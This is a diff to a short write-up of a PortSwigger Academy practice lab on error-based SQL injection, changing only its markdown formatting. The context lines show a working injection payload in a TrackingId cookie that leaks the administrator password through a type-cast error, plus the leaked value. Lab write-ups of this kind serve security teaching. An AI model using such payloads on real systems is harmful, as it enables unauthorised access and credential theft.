@@ -78,6 +78,8 @@ TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
 ERROR: invalid input syntax for type integer: `"no550cvei33s1g0wogji"`
 ```
 This leaked the administrator password.
-//**Results:**
+---
+**Results:**
 //The password `no550cvei33s1g0wogji` was used to log in successfully as administrator, completing the lab.
 *Practice lab from PortSwigger Academy — documented by @cybernerddd*
+---
